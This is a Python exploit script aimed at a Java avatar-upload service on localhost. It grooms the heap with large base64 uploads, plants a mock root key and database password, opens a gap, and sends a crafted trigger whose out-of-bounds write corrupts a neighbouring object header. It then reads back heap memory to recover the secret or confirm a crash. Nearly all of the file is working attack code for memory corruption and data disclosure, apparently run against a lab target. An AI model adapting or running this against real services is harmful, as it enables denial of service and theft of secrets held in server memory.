#!/usr/bin/env python3
"""Saturation experiment — heap packed to ~70% so free runs are scarce:
   trigger dst (6R) MUST land in the freshly-dropped 6R gap whose neighbors
   are live cached fillers → boundary write deterministically hits a live header.
Cycles: drop f(71+c) → cycle → trigger → diag sign → disclosure probe.
"""
import json, re, sys, time, urllib.request, urllib.error, base64 as b64

BASE = "http://127.0.0.1:8080"
GCLOG = "/share/gc.log"
MB = 1048576
CYCLE = re.compile(r"Concurrent Mark Cycle .*ms")
FILL_M = 2097133   # decoded filler = 3m+1 = 6291400 (6 regions)
TRIG_K = 2097136   # decoded trigger = 6291409 (6 regions), slack = 31 → phase 1
PHASE = (31 + 12) % 3

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method,
        headers={"X-User": "demo", "Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return -1, str(e).encode(), {}

def diag():
    c, b, _ = req("GET", "/api/diag", timeout=15)
    try: return json.loads(b.decode())
    except Exception: return {}

def cycles():
    try: return len(CYCLE.findall(open(GCLOG, errors="ignore").read()))
    except OSError: return -1

def wait_cycle(before, timeout=120):
    deadline = time.time() + timeout
    while time.time() < deadline:
        now = cycles()
        if now > before: return now
        time.sleep(1)
    return before

def alive():
    return req("GET", "/api/status", timeout=5)[0] == 200

def marker(i):
    return ("FILLMARK-f%d-" % i).encode() + b"|" + ("%032d" % i).encode()

def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    cycles_n = int(args[0]) if args else 8
    do_warm = "--warm" in sys.argv

    if not alive():
        print("VICTIM-DOWN"); sys.exit(2)

    # reset: 201 small puts → CACHE.clear() → fresh fragmentation-free layout
    print("[R] resetting cache (201 junk puts → clear)...", flush=True)
    junk = b64.b64encode(b"M" * 64)
    for i in range(201):
        req("POST", "/api/avatar?id=rst%d" % i, junk)
    st = req("GET", "/api/status")[1].decode().strip()
    print("[R] after clear:", st, flush=True)

    if do_warm:
        shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A"*4096+b"AB",
                  b"A"*4096+b"ABC", b"A"*4096+b"AB=="]
        print("[W] warm 20K...", flush=True)
        for i in range(20000):
            c, _, h = req("POST", "/api/avatar?id=warm", b64.b64encode(shapes[i & 3]))
            if c == 201: req("DELETE", "/api/avatar?id=warm")
        print("[W] done", flush=True)

    # fill: f0..f69, cred, f71..f(69+cycles_n+1+N) — enough fills for N cycles
    total_b = 70 + 1 + cycles_n + 2   # f0..f69, cred, f71.. f(70+cycles_n+2)
    fill_body = (b"A" * (4 * FILL_M)) + b"AB"
    trig_body = (b"A" * (4 * TRIG_K)) + b"=="
    print("[F] filling %d x 6.29MB (~%dMB live)... this is the saturation phase" %
          (total_b, total_b * 6291400 // MB), flush=True)
    for i in range(70):
        c, b, _ = req("POST", "/api/avatar?id=f%d" % i, fill_body)
        if c != 200:
            print("[F] fill f%d FAILED %s %s" % (i, c, b[:120]), flush=True)
            print("[F] stopping fills at %d — heap at capacity (ok for saturation)" % i, flush=True)
            break
        if i % 20 == 0: print("[F] f%d" % i, flush=True)
    secret = (b"CLASSIFIED-ROOT-KEY=A7f3c9e1d2b8a6405f7c2e91d4b6a830 "
              b"DB-PASSWORD=hunter2-special-session ")
    cred_body = b64.b64encode(secret + b"X" * (6291400 - len(secret)))
    req("POST", "/api/avatar?id=cred", cred_body)
    print("[F] cred planted", flush=True)
    for i in range(71, 70 + cycles_n + 2):
        c, b, _ = req("POST", "/api/avatar?id=f%d" % i, fill_body)
        if c != 200:
            print("[F] fill f%d FAILED %s — heap full, proceeding" % (i, c), flush=True)
            break
    print("[F] state:", req("GET", "/api/status")[1].decode().strip(), flush=True)

    if do_warm:
        # warm AFTER fills so decode0 compiles without allocation interference
        shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A"*4096+b"AB",
                  b"A"*4096+b"ABC", b"A"*4096+b"AB=="]
        print("[W] warm 20K...", flush=True)
        for i in range(20000):
            c, _, h = req("POST", "/api/avatar?id=warm", b64.b64encode(shapes[i & 3]))
            if c == 201: req("DELETE", "/api/avatar?id=warm")
        print("[W] done", flush=True)

    # cycles: drop f(71+c) → gap (neighbors: live fills both sides) → trigger → diag
    for c in range(cycles_n):
        fid = 71 + c
        probe_fid = fid + 1   # next filler after the gap = corruption target
        code, body, _ = req("DELETE", "/api/avatar?id=f%d" % fid)
        print("[C%d] dropped f%d (%s)" % (c, fid, body[:40].decode("latin-1").strip()), flush=True)
        c0 = cycles()
        c1 = wait_cycle(c0, 90)
        print("[C%d] cycle %d -> %d" % (c, c0, c1), flush=True)

        code, body, _ = req("POST", "/api/avatar?id=trig_c%d" % c, trig_body, timeout=120)
        print("[C%d] trigger -> HTTP %s" % (c, code), flush=True)
        if not alive():
            print("★★★ JVM DIED (trigger %d + GC) — corruption confirmed, crash-class ★★★" % c, flush=True)
            print("VERDICT: CRASH-CONFIRMED"); sys.exit(42)
        time.sleep(2)

        d = diag()
        if d is None:
            print("VERDICT: DIAG-FAIL"); sys.exit(2)
        target_len = d.get("f%d" % probe_fid)
        print("[C%d] diag f%d = %s (expect 6291400)" % (c, probe_fid, target_len), flush=True)
        if target_len is None:
            print("[C%d] target filler missing — skip" % c, flush=True); continue
        if target_len == 6291400:
            print("[C%d] header intact — write missed (dst not in gap or absorbed)" % c, flush=True)
            continue
        # CORRUPTED — sign!
        if target_len < 0:
            print("★★★ CORRUPTED LENGTH NEGATIVE: %d (phase %d rotation) — header smashed ★★★" % (target_len, PHASE), flush=True)
            # probe read: negative length → app path will throw; just record
            print("VERDICT: CORRUPTED-NEGATIVE"); sys.exit(41)
        # positive corrupted length → disclosure probe
        code, data, _ = req("GET", "/api/avatar?id=f%d" % probe_fid, timeout=120)
        got = len(data)
        print("★★★ CORRUPTED LENGTH POSITIVE: %d — GET returned %d bytes ★★★" % (target_len, got), flush=True)
        m = data.find(b"CLASSIFIED-ROOT-KEY")
        fm = data.find(b"FILLMARK-f%d-" % (probe_fid + 1))
        print("[P] secret marker at %s, next-filler marker at %s" % (m, fm), flush=True)
        if m >= 0:
            print("[P] SECRET RECOVERED: " + data[m:m + 64].decode("latin-1", "replace"), flush=True)
        open("/tmp/disclosure_c%d.bin" % c, "wb").write(data)
        print("VERDICT: DISCLOSED (%d bytes of heap returned; +%d past true bound)"
              % (got, got - 6291400), flush=True)
        sys.exit(43)

    print("VERDICT: NO-HIT (%d cycles, no header corruption — dst placement still scatter)" % cycles_n, flush=True)
    sys.exit(0)

if __name__ == "__main__":
    main()
